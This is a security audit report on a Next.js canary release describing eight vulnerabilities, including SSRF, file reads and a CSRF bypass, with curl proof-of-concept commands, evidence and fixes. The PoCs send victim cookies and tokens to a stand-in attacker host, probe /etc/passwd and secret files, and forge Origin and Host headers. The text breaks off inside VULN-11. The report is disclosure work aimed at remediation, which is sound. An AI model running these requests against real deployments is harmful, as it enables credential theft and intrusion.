# Next.js Security Audit Report

## Executive Summary

This audit examined Next.js commit `007051470157d38058730ffa0a1983d4b4106424` (v16.3.0-canary.29) for security vulnerabilities. Eight issues were identified and confirmed against live instances in a Docker-based test environment:

| ID | Title | Severity | Mode |
|----|-------|----------|------|
| VULN-1 | SSRF via Image Optimizer Redirect (remotePatterns bypass) | High | Production |
| VULN-4 | Arbitrary File Read via Source Map Endpoint (webpack dev server) | Medium | Dev only |
| VULN-6 | Path Traversal in launch-editor via isAppRelativePath | Medium | Dev only |
| VULN-7 | Server Action CSRF Bypass via x-forwarded-host Header Injection | High | Production |
| VULN-8 | Middleware Rewrite SSRF with Credential Forwarding to Arbitrary Hosts | High | Production |
| VULN-9 | DNS Rebinding Bypass of blockCrossSiteDEV (dev mode) | Medium | Dev only |
| VULN-10 | Edge Runtime Server Action Unbounded Body (DoS) | Medium | Production (edge) |
| VULN-11 | Route Oracle and SSR Skip via Unfiltered x-middleware-prefetch Header | High | Production |

One exploit chain (CHAIN-1) combines VULN-8 and VULN-7 into a credential theft → account takeover scenario rated Critical. An informational note on Server Actions' missing-Origin allowance (documented intentional behavior) is included in the appendix.

All eight vulnerabilities are independently reproducible using the provided exploit scripts. Findings removed during verification (VULN-2, VULN-3, VULN-5) and chains removed (CHAIN-2, CHAIN-3) are documented in the Verification Notes appendix with rationale.

---

## Scope

- **Repository:** next.js
- **Commit:** `007051470157d38058730ffa0a1983d4b4106424`
- **Version:** 16.3.0-canary.29
- **Testing Environment:** Docker containers on a private bridge network (`audit-net`)
- **Test Modes:** Production (`next build` + `next start`), Dev mode (`next dev --webpack`), and Edge runtime production (`next build` + `next start` with `export const runtime = 'edge'`)
- **Testing Date:** 2026-05-26

---

## VULN-1: SSRF via Image Optimizer Redirect (remotePatterns bypass)

**Severity:** High

**Affected Code:**
- `packages/next/src/server/image-optimizer.ts:454` — `validateParams` checks `hasRemoteMatch` on the initial URL only
- `packages/next/src/server/image-optimizer.ts:909-928` — `fetchExternalImage` follows redirects recursively without re-validating the redirect target against `remotePatterns`

**Root Cause:**

The `validateParams` function correctly validates that the requested image URL matches the configured `remotePatterns` allowlist. However, `fetchExternalImage` uses `fetch(..., { redirect: 'manual' })` and manually follows redirect responses by calling itself recursively with the `Location` header value. This recursive call passes the redirect target URL directly to `fetchExternalImage` without re-running the `remotePatterns` check via `validateParams` or `hasRemoteMatch`.

An attacker who controls any server in `remotePatterns` (or can intercept traffic to it) can redirect the image optimizer to an arbitrary host.

**Attack Scenario:**

A production deployment allows `remotePatterns` for `images.example.com` (legitimate CDN). An attacker sets up a redirect at `https://images.example.com/evil-redirect` that points to `http://internal-metadata-server/latest/meta-data/`. The image optimizer fetches the redirect target and returns its content as an "image," exfiltrating internal service data.

In the audit environment: `remotePatterns` allows `audit-redirect-server:8080`. A request to `/_next/image?url=http://audit-redirect-server:8080/redirect-to-secret&w=640&q=75` causes the optimizer to follow a redirect to `audit-secret-server:9090`, which is not in `remotePatterns`.

**Configuration note:** The Docker PoC sets `dangerouslyAllowLocalIP: true` in `next.config.js` because the test environment uses private Docker network IPs. Without this flag, redirects to private IP ranges (10.x, 172.16-31.x, 169.254.x, 127.x) are blocked by `isPrivateIp()` in `fetchExternalImage`. The core vulnerability — missing `remotePatterns` re-validation on redirect targets — works against any redirect target on a public IP without `dangerouslyAllowLocalIP`. For example, a redirect from an allowed CDN host to an attacker-controlled public server bypasses `remotePatterns` regardless of this setting.

**Reproduction Steps:**

```bash
# Negative control — direct access to secret server is blocked (400)
curl -s -o /dev/null -w '%{http_code}' \
  'http://localhost:3000/_next/image?url=http%3A%2F%2Faudit-secret-server%3A9090%2Fsecret-image.jpg&w=640&q=75'
# Expected: 400

# Positive exploit — redirect server in remotePatterns, redirects to secret server
curl -s -o /tmp/exploit.bin -w '%{http_code}' \
  'http://localhost:3000/_next/image?url=http%3A%2F%2Faudit-redirect-server%3A8080%2Fredirect-to-secret&w=640&q=75'
# Expected: 200

# Confirm secret server received the request
docker logs audit-secret-server 2>&1 | grep SECRET_ACCESS
# Expected: SECRET_ACCESS: <timestamp> <ip>
```

**Evidence:**
- Direct request to `audit-secret-server:9090` returns HTTP 400 confirming `remotePatterns` blocks it
- Redirect-mediated request returns HTTP 200 with image data from `audit-secret-server:9090`
- Secret server logs show `SECRET_ACCESS` entry from the Next.js container

**Remediation:**

Re-validate the redirect target against `remotePatterns` before following it. In `fetchExternalImage`, before recursing with the redirect URL, call `hasRemoteMatch(domains, remotePatterns, new URL(redirect))` and throw an `ImageError` if the redirect target is not in the allowlist. This requires threading `domains` and `remotePatterns` through `fetchExternalImage`'s call signature.

Alternatively, use `redirect: 'follow'` in the initial `fetch()` call only after ensuring the final URL matches `remotePatterns` by using a redirect hook or by resolving the full redirect chain before fetching.

---

## VULN-4: Arbitrary File Read via Source Map Endpoint (webpack dev server)

**Severity:** Medium (dev mode only — this endpoint is not registered in production builds)

**Affected Code:**
- `packages/next/src/server/dev/middleware-webpack.ts:697-710` — `/__nextjs_source-map` handler, user-controlled `filename` with no validation
- `packages/next/src/server/dev/get-source-map-from-file.ts:26-80` — `getSourceMapFromFile`: reads arbitrary file, follows `//# sourceMappingURL=` to a second arbitrary file, parses and returns it as JSON

**Root Cause:**

The `/__nextjs_source-map` endpoint is registered by the webpack hot-reloader. It accepts a `filename` query parameter, converts it to a `file://` URL if the path is absolute, and calls `getSourceMapFromFile`. That function:

1. Reads the file at the supplied path via `fs.readFile` with no path validation or allowlist.
2. Scans for a `//# sourceMappingURL=<target>` comment and resolves the target path via `path.resolve(path.dirname(filename), decodeURIComponent(sourceUrl))` — again with no validation.
3. Reads the resolved target path, parses it as JSON, and returns the parsed source map (including `sourcesContent`) to the client.

There is no authentication on this endpoint. Cross-origin requests from curl (no `Origin` header) are allowed because `blockCrossSiteDEV` returns `false` when `originLowerCase` is `undefined`.

**Error oracle:** For non-existent or non-readable files, the endpoint returns HTTP 500 with the error message (including the filename) in the response body — functioning as a file existence oracle for arbitrary paths.

**Attack Scenario:**

Any process or script that can reach the dev server's port can read arbitrary files on the filesystem. By constructing a "chain" file containing `//# sourceMappingURL=/path/to/target`, the attacker causes the endpoint to read and return the target file's contents. If the target is valid JSON (e.g., a `.json` config file, a source map, or a crafted file containing secrets), the full contents are returned. For non-JSON targets (e.g., `/etc/passwd`), a 500 error with the target path confirms file existence.

In the audit environment: `/tmp/chain.js` contains `//# sourceMappingURL=/tmp/secret_sourcemap.json`. Requesting `/__nextjs_source-map?filename=/tmp/chain.js` returns a 200 with `sourcesContent: ["DEV_SECRET_KEY=sk-live-production-key-12345"]`.

**Reproduction Steps:**

```bash
# Negative control — nonexistent file returns 500 with path in error
curl -s 'http://localhost:3002/__nextjs_source-map?filename=/nonexistent/path.js'
# Expected: 500 with error body mentioning the path

# Positive exploit — chain file exfiltrates secret_sourcemap.json contents
curl -s 'http://localhost:3002/__nextjs_source-map?filename=/tmp/chain.js'
# Expected: 200 JSON with sourcesContent containing DEV_SECRET_KEY

# System file probe — chain_etc_passwd.js follows sourceMappingURL to /etc/passwd
curl -s 'http://localhost:3002/__nextjs_source-map?filename=/tmp/chain_etc_passwd.js'
# Expected: 500 with JSON parse error referencing /etc/passwd (file was read)
```

**Evidence:**
- HTTP 200 response to chain.js request contains `DEV_SECRET_KEY=sk-live-production-key-12345` from `sourcesContent`
- HTTP 500 response to chain_etc_passwd.js request contains error referencing `/etc/passwd` — proving the file was read and attempted to parse as JSON
- HTTP 500 response to nonexistent path request contains the supplied path — confirming file existence oracle

**Remediation:**

Restrict the `filename` parameter to paths within the project root (or the webpack compilation output directory). Validate that the resolved path starts with the Next.js root directory before calling `fs.readFile`. Apply the same check to the resolved `sourceMappingURL` target path. Alternatively, only serve source maps for modules that are actually tracked in the webpack module graph, rejecting requests for arbitrary filesystem paths.

---

## VULN-6: Path Traversal in launch-editor via isAppRelativePath

**Severity:** Medium

**Affected Code:**
- `packages/next/src/server/dev/middleware-webpack.ts:646-654` — `/__nextjs_launch-editor` handler: `path.join('app', isSrcDir ? 'src' : '', relativeFilePath)` does not sanitize traversal sequences
- `packages/next/src/next-devtools/server/launch-editor.ts:455-469` — `filePath = path.join(nextRootDirectory, file)`: resolves traversal to absolute path, then calls `fsp.access(filePath, F_OK)` and `launchEditor(filePath, ...)`

**Root Cause:**

When `isAppRelativePath=1` is supplied, the handler computes `appPath = path.join('app', '', relativeFilePath)`. Node's `path.join` normalizes `..` components: `path.join('app', '', '../../../../etc/passwd')` = `../../../../etc/passwd`. This relative path is then passed to `launch-editor.ts`, which prepends the Next.js root directory: `path.join('/app', '../../../../etc/passwd')` = `/etc/passwd`.

The code then calls `fsp.access(filePath, F_OK)` — returning HTTP 204 if the file exists, and HTTP 404 otherwise. This creates a **file existence oracle**: an attacker can enumerate arbitrary filesystem paths by observing the 204/404 differential.

With `REACT_EDITOR=cat` (or any other non-editor binary) set in the environment, matching files are additionally passed to `child_process.spawn(editor, [filePath])`. This amplifies the oracle to include a command execution side-channel (output goes to server stdout).

**Note:** The file existence oracle is the primary exploit and requires no environment configuration. The command execution side-channel requires the server to have a permissive `REACT_EDITOR` setting, which is not the default.

**Attack Scenario:**

An attacker on the network (or any local process) sends:
```
GET /__nextjs_launch-editor?file=../../../../etc/shadow&isAppRelativePath=1
```
A 204 response confirms `/etc/shadow` is readable. By iterating over common secret file paths (`/root/.ssh/id_rsa`, `/etc/secrets/db-password`, etc.), the attacker maps the server's filesystem without any authentication.

The same vulnerability is present in `middleware-turbopack.ts:399-409` — the path traversal applies regardless of bundler.

**Reproduction Steps:**

```bash
# Negative control — nonexistent file returns 404
curl -s -o /dev/null -w '%{http_code}' \
  'http://localhost:3002/__nextjs_launch-editor?file=nonexistent_xyz.txt&isAppRelativePath=1'
# Expected: 404

# Positive exploit — path traversal to /etc/passwd
curl -s -o /dev/null -w '%{http_code}' \
  'http://localhost:3002/__nextjs_launch-editor?file=../../../../etc/passwd&isAppRelativePath=1'
# Expected: 204 (file exists at /etc/passwd — traversal confirmed)

# Secret file probe
curl -s -o /dev/null -w '%{http_code}' \
  'http://localhost:3002/__nextjs_launch-editor?file=../../../../tmp/dev_secret.txt&isAppRelativePath=1'
# Expected: 204 (file exists outside project root)
```

**Evidence:**
- Nonexistent file returns 404 — baseline confirmed
- `../../../../etc/passwd` traversal returns 204 — `/etc/passwd` found outside `/app`
- `../../../../tmp/dev_secret.txt` traversal returns 204 — confirms oracle reaches `/tmp`

**Remediation:**

After computing `appPath`, validate that `path.resolve(nextRootDirectory, appPath)` starts with `nextRootDirectory` before proceeding. Alternatively, validate `relativeFilePath` does not contain `..` components. The `path.resolve` + prefix check pattern is the standard mitigation for path traversal in Node.js.

---

## VULN-7: Server Action CSRF Bypass via x-forwarded-host Header Injection

**Severity:** High (many Next.js applications are deployed directly internet-facing on platforms like Railway, Fly.io, and Docker without a reverse proxy that overwrites `x-forwarded-host`; applications using `SameSite=None` for OAuth/federated auth flows are not protected by browser cookie defaults)

**Affected Code:**
- `packages/next/src/server/app-render/action-handler.ts:482-518` — `parseHostHeader`: when called without `originDomain`, unconditionally returns `x-forwarded-host` value if present, prioritizing it over the `host` header
- `packages/next/src/server/app-render/action-handler.ts:635,652` — CSRF check calls `parseHostHeader(req.headers)` (without `originDomain`) and compares `originHost` against the returned value
- `packages/next/src/server/lib/server-ipc/utils.ts:42-54` — `INTERNAL_HEADERS` list does not include `x-forwarded-host`, so it is never stripped by `filterInternalHeaders`

**Root Cause:**

The CSRF check for Server Actions compares the `origin` header's host against the value returned by `parseHostHeader(req.headers)`. The `parseHostHeader` function, when called without the optional `originDomain` parameter (as it is at line 635), returns `x-forwarded-host` unconditionally if that header is present, falling back to `host` only if `x-forwarded-host` is absent.

The `filterInternalHeaders` function in `server-ipc/utils.ts` strips headers in the `INTERNAL_HEADERS` list from incoming requests before processing. `x-forwarded-host` is not in this list. An external attacker can therefore inject `x-forwarded-host` with an arbitrary value.

Attack: send `Origin: https://evil.com` (sets `originHost = "evil.com"`) together with `x-forwarded-host: evil.com` (sets `host.value = "evil.com"` via `parseHostHeader`). The CSRF check `originHost === host.value` evaluates `"evil.com" === "evil.com"` — match passes. The action executes.

**Note:** `parseHostHeader` has an `originDomain` parameter (lines 493-504) designed to constrain which host values can be returned. However, the actual CSRF check at line 635 never passes `originDomain`. The defense exists in code but is not wired up.

**Precondition:** Next.js must be directly internet-facing without an upstream proxy that rewrites or removes `x-forwarded-host`. Deployments behind Nginx, Cloudflare, or a load balancer that sets `x-forwarded-host` to the actual client hostname are NOT affected — the proxy's value overwrites the attacker's.

**Browser mitigation note:** Modern browsers default to `SameSite=Lax` for cookies, which prevents cross-site POST requests from including cookies. This mitigates the browser-based CSRF vector for cookies without explicit `SameSite=None`. However, the bypass remains exploitable for: (1) applications that set `SameSite=None` on session cookies (common for cross-site embedding or OAuth flows), (2) non-browser attack scenarios (compromised proxies, network intermediaries, or scripted requests with stolen credentials), and (3) any deployment where cookies are explicitly configured as `SameSite=None; Secure`.

**Attack Scenario:**

A Next.js application is deployed directly on a cloud VM without a reverse proxy. A cross-origin attacker wants to invoke a Server Action (e.g., a privileged mutation) on behalf of a victim user. Normal CSRF protection rejects requests where `Origin` does not match `host`. The attacker sends:

```
Origin: https://evil.com
x-forwarded-host: evil.com
```

The CSRF check passes. The attacker invokes the Server Action with the victim's session cookie (obtained via a separate XSS or cookie-stealing attack), executing the privileged operation.

**Reproduction Steps:**

```bash
# Extract 42-char action ID from manifest
ACTION_ID=$(docker exec audit-nextjs-app \
  cat /app/.next/server/server-reference-manifest.json \
  | grep -oE '[0-9a-f]{42}' | head -1)

# Negative control — mismatched Origin, no x-forwarded-host (should be rejected)
NEG_STATUS=$(curl -s -o /tmp/neg_body.txt -w '%{http_code}' -X POST \
  -H "Next-Action: $ACTION_ID" \
  -H "Content-Type: text/plain;charset=UTF-8" \
  -H "Cookie: session=victim_csrf_token" \
  -H "Origin: https://evil.com" \
  --data '[]' \
  'http://localhost:3000/')
# Expected: non-200 status, OR body contains "Invalid Server Actions request"

# Positive exploit — Origin: https://evil.com + x-forwarded-host: evil.com (should bypass)
curl -s -X POST \
  -H "Next-Action: $ACTION_ID" \
  -H "Content-Type: text/plain;charset=UTF-8" \
  -H "Cookie: session=victim_csrf_token" \
  -H "Origin: https://evil.com" \
  -H "x-forwarded-host: evil.com" \
  --data '[]' \
  'http://localhost:3000/'
# Expected: HTTP 200, no "Invalid Server Actions request" in body
```

**Evidence:**
- Without `x-forwarded-host`: request rejected (non-200 status or CSRF error body) — baseline protection confirmed
- With `x-forwarded-host: evil.com`: request returns HTTP 200 without CSRF error — bypass confirmed
- `INTERNAL_HEADERS` in `utils.ts:42-54` does not include `x-forwarded-host` — header passes unstripped

**Remediation:**

Option 1: Add `x-forwarded-host` to the `INTERNAL_HEADERS` list in `server-ipc/utils.ts`. This strips the header for all external requests, preventing injection. Deployments that legitimately rely on `x-forwarded-host` would need to configure trust explicitly.

Option 2: Wire the `originDomain` parameter at `action-handler.ts:635`: change `parseHostHeader(req.headers)` to `parseHostHeader(req.headers, originHost)`. This makes the function return a value only if it matches the origin, regardless of which header provides it.

Option 3: Add a `serverActions.trustXForwardedHost` config flag (defaulting to `false`) that controls whether `x-forwarded-host` is trusted for CSRF checking, similar to the `trustHost` pattern used in other frameworks.

---

## VULN-8: Middleware Rewrite SSRF with Credential Forwarding to Arbitrary Hosts

**Severity:** High (the middleware rewrite pattern using request-derived values is extremely common — multi-tenant routing, A/B testing backends, locale-based backends — and the framework provides no safety rail against credential forwarding to cross-origin rewrite targets)

**Affected Code:**
- `packages/next/src/server/lib/router-utils/proxy-request.ts:25-36` — `proxyRequest`: creates `http-proxy` instance with `changeOrigin: true`; `http-proxy` forwards all original request headers (including `Cookie` and `Authorization`) to the target by default
- `packages/next/src/server/lib/router-server.ts:499-508` — calls `proxyRequest(req, res, parsedUrl, ...)` when middleware rewrite destination has a protocol (cross-origin), with no host validation
- `packages/next/src/server/lib/router-utils/resolve-routes.ts:726-739` — when `x-middleware-rewrite` contains a cross-origin URL, returns `{finished: true, parsedUrl}` with the full external URL preserved in `parsedUrl`
- `packages/next/src/server/web/utils.ts:141-152` — `validateURL`: validates only that the rewrite destination is a parseable absolute URL; performs no host allowlist check

**Root Cause:**

`NextResponse.rewrite(destination)` sets the `x-middleware-rewrite` response header to the destination URL. When the destination is on a different origin than the application (different host or protocol), `resolve-routes.ts` returns `finished: true` with the full external URL. `router-server.ts` then calls `proxyRequest`, which uses `http-proxy` to forward the original request — including ALL headers — to the external target.

There is no host allowlist or validation for rewrite destinations at any point in this pipeline. Any URL that passes `new URL()` parsing is accepted. Crucially, `http-proxy` forwards the `Cookie` and `Authorization` headers from the original client request to the attacker-controlled destination.

This means that a middleware reading any user-controlled value (query parameter, header, path segment) and using it as a rewrite destination enables SSRF with full credential forwarding.

**Attack Scenario:**

A Next.js application uses middleware to route to different backends based on a query parameter (a common pattern for multi-tenant routing, A/B testing, or locale-based backends). An attacker sends a request to the application with a crafted `?backend=` parameter pointing to an attacker-controlled server. The middleware rewrites to the attacker's server. The `proxyRequest` call forwards the victim user's `Cookie` and `Authorization` headers to the attacker's server, leaking credentials.

In a realistic scenario: a victim user visits `https://app.example.com/?backend=https://attacker.com/steal` (e.g., via a phishing link or injected URL). The middleware rewrites the request to `attacker.com/steal`, forwarding the victim's session cookie. The attacker logs the cookie and takes over the session.

**Reproduction Steps:**

```bash
# Negative control — normal request returns the app page
curl -s 'http://localhost:3003/'
# Expected: HTTP 200 with "Middleware Audit App" in body

# Positive exploit — rewrite to attacker-controlled server with victim credentials
curl -s \
  -H "Cookie: session=VICTIM_SECRET_TOKEN_12345" \
  -H "Authorization: Bearer sk-secret-api-key-67890" \
  'http://localhost:3003/?backend=http://audit-credential-capture:9091/steal'
# Expected: HTTP 200 (proxy completed successfully)

# Verify credentials were captured by attacker server
docker logs audit-credential-capture 2>&1 | grep CREDENTIAL_CAPTURED
# Expected: lines containing VICTIM_SECRET_TOKEN_12345 and sk-secret-api-key-67890
```

**Evidence:**
- Normal request (`GET /`) returns HTTP 200 with app page — app running correctly
- Exploit request with `?backend=http://audit-credential-capture:9091/steal` returns HTTP 200
- `docker logs audit-credential-capture` shows `CREDENTIAL_CAPTURED: cookie=session=VICTIM_SECRET_TOKEN_12345` and `CREDENTIAL_CAPTURED: authorization=Bearer sk-secret-api-key-67890`

**Remediation:**

Option 1: Strip credential headers (`Cookie`, `Authorization`, `X-Auth-*`) before proxying to cross-origin rewrite destinations in `proxy-request.ts`. Credentials should only be forwarded to the application's own origin.

Option 2: Add a `rewrites.allowedExternalHosts` config option (analogous to `images.remotePatterns`) that restricts which external hosts middleware may rewrite to. Reject rewrites to hosts not in the allowlist.

Option 3: Document the credential-forwarding behavior prominently in the `NextResponse.rewrite()` documentation, so developers using user-controlled values as rewrite destinations understand the risk. This is a mitigation, not a fix.

**PoC note:** The audit test app uses purpose-built middleware that passes a query parameter directly to `NextResponse.rewrite()`. In production, middleware that uses any request-derived value (path segments, cookies, headers) as a rewrite destination is susceptible to the same credential-forwarding issue. Common patterns include multi-tenant routing, A/B testing backends, and locale-based backend selection.

---

## VULN-9: DNS Rebinding Bypass of blockCrossSiteDEV (dev mode)

**Severity:** Medium (dev mode only — Chrome blocks via Private Network Access; exploitable in Firefox/Safari)

**Affected Code:**
- `packages/next/src/server/lib/router-utils/block-cross-site-dev.ts:116-175` — `blockCrossSiteDEV`: lines 169-174 allow all requests with no `Origin` header; the `Host` header is never validated

**Root Cause:**

`blockCrossSiteDEV` guards all `/__nextjs*` and `/_next/*` dev endpoints from cross-origin access. Its final condition at lines 169-174:

```typescript
// Allow requests with no origin since those are just GET requests from same-site
return (
  originLowerCase !== undefined &&
  !isCsrfOriginAllowed(originLowerCase, allowedOrigins) &&
  blockRequest(req, res, originLowerCase)
)
```

When `Origin` is absent, `originLowerCase === undefined` and the expression short-circuits to `false` — the request is allowed through. The function checks `Origin` and `Referer` but never the `Host` header.

Under DNS rebinding, the browser makes **same-origin** requests to the rebound address. Same-origin requests carry no `Origin` header. The `sec-fetch-site` check at lines 138-154 also does not trigger — it requires `sec-fetch-mode === 'no-cors' && sec-fetch-site === 'cross-site'`, but a DNS-rebound request has `sec-fetch-site: same-origin`.

**Attack Scenario:**

1. Attacker registers `evil.com` with short DNS TTL, initially pointing to their server.
2. Developer visits `http://evil.com:3000/` in Firefox or Safari. Attacker serves a malicious page.
3. DNS TTL expires. `evil.com` is rebound to `127.0.0.1`.
4. JavaScript on the page executes `fetch('/__nextjs_source-map?filename=...')` — same-origin (same scheme + host + port from browser's perspective) — no `Origin` header sent.
5. Browser sends `Host: evil.com:3000`, `sec-fetch-site: same-origin`, no `Origin`.
6. `blockCrossSiteDEV` returns `false` (no Origin -> undefined -> short-circuit).
7. Source map handler returns full source code including secrets. Attacker reads the response.

**Affected endpoints:** ALL `/__nextjs*` and `/_next/*` endpoints — source maps, stack frames, launch-editor, attach-inspector (→ RCE chain), restart-dev, devtools-config.

**Browser mitigation:** Chrome Private Network Access (PNA) blocks requests from public websites to `localhost` since Chrome 94+. Firefox and Safari do **not** implement PNA. The attack is exploitable in Firefox and Safari.

**Distinction from VULN-4/5/6:** VULN-4/5/6 require direct network access to the dev server (an attacker already on the network). VULN-9 requires only that the developer visits a malicious webpage — the browser makes the localhost connection. Different attack vector (browser-based), different root cause (missing Host validation in blockCrossSiteDEV).

**Reproduction Steps:**

```bash
# Negative control — explicit cross-origin Origin header is blocked (403)
curl -s -o /dev/null -w '%{http_code}' \
  -H "Origin: http://evil.com" \
  "http://localhost:3002/__nextjs_source-map?filename=test"
# Expected: 403

# DNS rebinding bypass — evil Host header, NO Origin header
curl -s -o /dev/null -w '%{http_code}' \
  -H "Host: evil.com:3000" \
  "http://localhost:3002/__nextjs_source-map?filename=test"
# Expected: non-403 (204 No Content — request reached the handler)

# Source code exfiltration — read project source file
curl -s -H "Host: evil.com:3000" \
  "http://localhost:3002/__nextjs_source-map?filename=/app/app/page.tsx"
# Expected: non-403 (source map handler processed the request)

# launch-editor oracle also reachable
curl -s -o /dev/null -w '%{http_code}' \
  -H "Host: evil.com:3000" \
  "http://localhost:3002/__nextjs_launch-editor?file=app/page.tsx"
# Expected: 204 (file exists — all /__nextjs* endpoints bypassed)
```

**Evidence:**
- Explicit `Origin: http://evil.com` returns 403 — baseline protection confirmed
- `Host: evil.com:3000` with no Origin returns non-403 — `blockCrossSiteDEV` bypassed
- `/__nextjs_launch-editor` returns 204 — all dev endpoints reachable via DNS rebinding

**Remediation:**

Validate the `Host` header in `blockCrossSiteDEV`. If the `Host` header does not match `localhost`, `127.0.0.1`, `[::1]`, the configured hostname, or entries in `allowedDevOrigins`, block the request with 403. This prevents DNS-rebound requests with an attacker-controlled `Host` from passing the check even when `Origin` is absent.

---

## VULN-10: Edge Runtime Server Action Unbounded Body (DoS)

**Severity:** Medium

**Affected Code:**
- `packages/next/src/server/app-render/action-handler.ts:759` — explicit `// TODO: add body limit` comment; no size check anywhere in the edge block (lines 749-869)
- `packages/next/src/server/app-render/action-handler.ts:773` — `await req.request.formData()` reads the entire multipart body into memory without size limit
- `packages/next/src/server/app-render/action-handler.ts:851-862` — `while(true)` reader loop accumulates non-multipart body without size limit
- `packages/next/src/server/app-render/action-handler.ts:901-931` — `sizeLimitTransform` with 1MB default limit, used ONLY in the Node runtime path; absent from edge path

**Root Cause:**

The action handler has two paths: Node runtime (lines 875+) and edge runtime (lines 749-869). The Node path wraps the request body in `sizeLimitTransform`, which counts bytes and throws an `ApiError(413)` when the body exceeds the configured limit (default 1MB). This error is caught by the RSC error boundary (resulting in HTTP 500 to the client), but critically the body read is aborted before the full payload is buffered — the server is protected from memory exhaustion. The edge runtime path has an explicit `// TODO: add body limit` comment but no enforcement. All body reads in the edge path — both multipart (`formData()`) and non-multipart (reader loop) — are unbounded.

An attacker can send bodies exceeding the intended 1MB limit to any edge-runtime server action endpoint. While this is a defense-in-depth gap (the Node runtime enforces the limit but edge does not), practical DoS impact depends on the deployment platform's own body size limits and the server's available memory.

**Attack Scenario:**

A Next.js application uses `export const runtime = 'edge'` on a page or route handler (e.g., for low-latency response or Vercel Edge Network deployment) that also processes server actions. An attacker sends a series of multi-megabyte POST requests to the server action endpoint. The edge handler buffers the entire body before processing. With no limit, the attacker can send bodies exceeding the intended 1MB limit. The practical ceiling depends on the deployment platform's ingress limits (e.g., Vercel Edge Functions enforce their own body limits), but self-hosted deployments have no framework-level protection on this code path.

**Production impact:** This is exploitable with `next start` (production mode) against any page with `export const runtime = 'edge'` that accepts form submissions or server actions. No authentication required.

**Reproduction Steps:**

```bash
# Extract action IDs (42 hex chars)
ACTION_ID_EDGE=$(docker exec audit-edge-app \
  cat /app/.next/server/server-reference-manifest.json | grep -oE '[0-9a-f]{42}' | head -1)
ACTION_ID_NODE=$(docker exec audit-nextjs-app \
  cat /app/.next/server/server-reference-manifest.json | grep -oE '[0-9a-f]{42}' | head -1)

# Generate 2MB payload
dd if=/dev/zero bs=1024 count=2048 | tr '\0' 'A' > /tmp/2mb_payload

# Negative control — Node runtime rejects 2MB body (sizeLimitTransform enforced)
curl -s -o /dev/null \
  -X POST \
  -H "Next-Action: $ACTION_ID_NODE" \
  -H "Content-Type: text/plain;charset=UTF-8" \
  --data-binary @/tmp/2mb_payload \
  "http://localhost:3000/"
docker logs audit-nextjs-app 2>&1 | tail -20 | grep "Body exceeded"
# Expected: "Body exceeded 1 MB limit" in server logs

# Positive exploit — Edge runtime accepts 2MB body (no limit enforced)
curl -s -o /dev/null \
  -X POST \
  -H "Next-Action: $ACTION_ID_EDGE" \
  -H "Content-Type: text/plain;charset=UTF-8" \
  --data-binary @/tmp/2mb_payload \
  "http://localhost:3004/"
docker logs audit-edge-app 2>&1 | tail -20 | grep "Body exceeded"
# Expected: No "Body exceeded" message — body was fully buffered without limit
```

**Evidence:**
- Node runtime (port 3000) server logs contain `Body exceeded 1 MB limit` after receiving 2MB body — `sizeLimitTransform` enforcement confirmed (the 413 ApiError is caught by the RSC error boundary, so the HTTP response is 500, but the body was rejected before full buffering)
- Edge runtime (port 3004) server logs do NOT contain `Body exceeded` — 2MB body was fully buffered into memory without any size enforcement
- Explicit `// TODO: add body limit` comment at `action-handler.ts:759` confirms the missing protection is known

**Remediation:**

Add body size enforcement to the edge runtime path in `action-handler.ts`. Before calling `req.request.formData()` (line 773) or entering the reader loop (lines 851-862), count bytes via a `ReadableStream` transform and throw a 413 response if the byte count exceeds the configured limit (matching the Node default of 1MB). The `serverActions.bodySizeLimit` configuration value is already available at this point in the function.

---

## VULN-11: Route Oracle and SSR Skip via Unfiltered x-middleware-prefetch Header

**Severity:** High (the missing filter entry allows any external client to bypass all server-side authentication logic, rate limiting, and logging on any dynamic page — while no protected content is directly returned, the SSR skip means auth middleware never fires, and `x-matched-path` provides a route existence oracle for hidden endpoints)

**Affected Code:**
- `packages/next/src/server/lib/server-ipc/utils.ts:42-54` — `INTERNAL_HEADERS` list does not include `x-middleware-prefetch`; `filterInternalHeaders()` at `router-server.ts:231` therefore does not strip it from external requests
- `packages/next/src/server/base-server.ts:2171-2183` — prefetch bail-out: when `!isSSG && req.headers['x-middleware-prefetch']` is truthy and the page is not a 404/error page, the server short-circuits: returns HTTP 200 with body `{}`, sets `x-matched-path` and `x-middleware-skip` response headers, and skips all server-side rendering

**Root Cause:**

`x-middleware-prefetch` is an internal header set by Next.js's client-side router during prefetch requests. It is not in the `INTERNAL_HEADERS` filter list in `server-ipc/utils.ts`, so external clients can inject it freely. When present on a request to any dynamically rendered (non-SSG) page that is not a 404 or error page, the server at `base-server.ts:2171-2183` short-circuits entirely:

```typescript
// base-server.ts:2171-2183
if (
  !isSSG &&
  req.headers['x-middleware-prefetch'] &&
  !(is404Page || pathname === '/_error')
) {
  res.setHeader(MATCHED_PATH_HEADER, pathname)
  res.setHeader('x-middleware-skip', '1')
  res.setHeader('cache-control', 'private, no-cache, no-store, max-age=0, must-revalidate')
  res.body('{}').send()
  return null
}
```

All server-side rendering is skipped: server components, `getServerSideProps`, any auth checks, any SSR side effects (logging, rate limiting, analytics). While no protected content is returned (the body is always `{}`), the SSR skip means authentication logic, rate limiting, and server-side logging never execute for the request. The `x-matched-path` response header additionally leaks the matched route pattern.

**Attack Scenario:**

A Next.js production application has protected pages that enforce authentication inside server components (e.g., reading session cookies via `await cookies()`). This is a common pattern — the `/protected` page in this audit's test app follows it exactly. An external attacker sends any request with the `x-middleware-prefetch: 1` header. The server returns `{}` without executing the auth check: no logging, no rate limiting, no authorization checks. While protected content is not directly exfiltrated (the body is `{}`), the auth logic is completely bypassed.

The `x-matched-path` response header additionally functions as a route existence oracle: an attacker can probe any path and observe whether `x-matched-path` is returned in the response to enumerate hidden or internal routes.

**Reproduction Steps:**

```bash
# Negative control — normal request renders the page via SSR
curl -s "http://localhost:3000/protected"
# Expected: body contains "Access Denied" (SSR executed, auth check ran)

# Positive exploit — x-middleware-prefetch bypasses SSR entirely
curl -s -D /tmp/vuln11_headers.txt -o /tmp/vuln11_body.txt \
  -H "x-middleware-prefetch: 1" \
  "http://localhost:3000/protected"
# Expected: body is exactly "{}" (SSR skipped, auth check never executed)

# Route oracle — x-matched-path header leaks route pattern
grep -i "x-matched-path" /tmp/vuln11_headers.txt
# Expected: x-matched-path: /protected

# x-middleware-skip confirms bypass mechanism
grep -i "x-middleware-skip" /tmp/vuln11_headers.txt
# Expected: x-middleware-skip: 1
```

**Evidence:**
- Normal request to `/protected` returns `Access Denied` — SSR executed correctly
- Request with `x-middleware-prefetch: 1` returns `{}` — SSR completely bypassed, auth check skipped
- Response header `x-matched-path: /protected` — route oracle confirmed
